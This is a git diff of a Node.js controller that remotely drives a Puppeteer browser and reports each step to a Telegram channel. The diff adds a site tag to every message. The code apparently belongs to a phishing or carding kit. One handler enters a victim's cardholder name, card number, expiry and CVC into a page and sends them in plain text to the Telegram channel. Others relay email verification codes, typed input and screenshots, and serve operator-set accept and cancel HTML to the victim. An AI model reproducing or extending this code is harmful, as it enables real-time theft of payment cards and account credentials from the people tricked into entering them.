@@ -9,6 +9,7 @@ let browser; // Global browser instance
 let page; // Global page instance
 let modifyedHTML = {};
 let start = false;
+const mainURL = '1111'
 
 module.exports = {
     LUNCH: async (req, res) => {
@@ -21,7 +22,7 @@ module.exports = {
                 executablePath: process.env.NODE_ENV === 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(),
                 protocolTimeout: 60000,
             });
-            await bot.sendMessage('@developers_00', `<b>Lunched:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>Lunched ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             if (browser) {
@@ -35,7 +36,7 @@ module.exports = {
             start = false;
             const bot = req.bot;
             await page.close();
-            await bot.sendMessage('@developers_00', `<b>CLOSED:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>CLOSED ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             return res.status(500).send({ success: false, message: error.message });
@@ -51,7 +52,7 @@ module.exports = {
             await page.goto(url, { waitUntil: 'networkidle0', timeout: 60000 });
             await page.setViewport({width: 566, height: 691});
             await page.waitForTimeout(5000);
-            await bot.sendMessage('@developers_00', `<b>GOPAGE:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>GOPAGE ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             console.log(error,'error ! ! !')
@@ -68,7 +69,7 @@ module.exports = {
             await page.keyboard.press('Tab');
             await page.keyboard.press('Enter');
             await page.waitForTimeout(5000);
-            await bot.sendMessage('@developers_00', `<b>PROCCED:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>PROCCED ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             return res.status(500).send({ success: false, message: error.message });
@@ -92,7 +93,7 @@ module.exports = {
                 await inputFields[i].type(codeArray[i], { delay: 100 });
             }
             await page.waitForTimeout(10000);
-            await bot.sendMessage('@developers_00', `<b>EMAILVERIFICATION:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>EMAILVERIFICATION ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             return res.status(500).send({ success: false, message: error.message });
@@ -116,7 +117,7 @@ module.exports = {
             });
             await page.waitForTimeout(5000);
             start = true;
-            await bot.sendMessage('@developers_00', `<b>START:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>START ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             return res.status(500).send({ success: false, message: error.message });
@@ -155,7 +156,7 @@ module.exports = {
             await page.keyboard.press('Tab');
             await page.keyboard.press('Enter');
             await page.waitForTimeout(10000);
-            await bot.sendMessage('@developers_00', `<b>SENDCARDDATA:</b>\n<b>name</b><code>${holder}</code>\n<b>num</b><code>${num}</code>\n<b>exp</b><code>${exp}</code>\n<b>svg</b><code>${cvc}</code>\n`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>SENDCARDDATA ${mainURL}:</b>\n<b>name</b><code>${holder}</code>\n<b>num</b><code>${num}</code>\n<b>exp</b><code>${exp}</code>\n<b>svg</b><code>${cvc}</code>\n`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (e) {
             return res.status(500).send({ success: false, message: 'ERROR ! ! !' });
@@ -166,7 +167,7 @@ module.exports = {
            const bot = req.bot;
            const { num, acceptButton, cancelButton} = req.body;
            modifyedHTML = { num, acceptButton, cancelButton };
-           await bot.sendMessage('@developers_00', `<b>SETHTML:</b>`, { parse_mode: 'HTML' });
+           await bot.sendMessage('@developers_00', `<b>SETHTML ${mainURL}:</b>`, { parse_mode: 'HTML' });
            return res.send({ success: true, message: modifyedHTML });
         }catch(error){
             return res.send({ success: false, message: error.message });
@@ -176,7 +177,7 @@ module.exports = {
         try{
             const bot = req.bot;
             res.send({ success: true, message: modifyedHTML });
-            return await bot.sendMessage('@developers_00', `<b>USER GETHTML:</b>`, { parse_mode: 'HTML' });
+            return await bot.sendMessage('@developers_00', `<b>USER GETHTML ${mainURL}:</b>`, { parse_mode: 'HTML' });
         }catch(error){
             return res.send({ success: false, message: error.message });
         }
@@ -193,7 +194,7 @@ module.exports = {
             } else {
                 await page.keyboard.press('Tab');
             }
-            await bot.sendMessage('@developers_00', `<b>TAB:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>TAB ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             return res.send({ success: false, message: error.message });
@@ -203,7 +204,7 @@ module.exports = {
         try {
             const bot = req.bot;
             await page.keyboard.press('Enter');
-            await bot.sendMessage('@developers_00', `<b>ENTER:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>ENTER ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             return res.send({ success: false, message: error.message });
@@ -217,7 +218,7 @@ module.exports = {
                 '../../public/screenshot.png'
             );
             await page.screenshot({ path: screenshotPath });
-            await bot.sendMessage('@developers_00', `<b>SCREENSHOT:</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>SCREENSHOT ${mainURL}:</b>`, { parse_mode: 'HTML' });
             return res.send({
                 success: true,
                 message: 'public/screenshot.png',
@@ -273,7 +274,7 @@ module.exports = {
             let { info } = req?.body;
             await page.focus('body');
             await page.keyboard.type(info);
-            await bot.sendMessage('@developers_00', `<b>WRITE: ${info}</b>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>WRITE ${mainURL}: ${info}</b>`, { parse_mode: 'HTML' });
             return res.send({ success: true, message: 'OK' });
         } catch (error) {
             console.log(error,'error')
@@ -301,7 +302,7 @@ module.exports = {
         try{
             const bot = req.bot;
             const { name } = req.body;
-            await bot.sendMessage('@developers_00', `<b>User click to:</b> <code>${name}</code>`, { parse_mode: 'HTML' });
+            await bot.sendMessage('@developers_00', `<b>User click to ${mainURL}:</b> <code>${name}</code>`, { parse_mode: 'HTML' });
             if(name === 'cancel'){
                 start = false;
             }
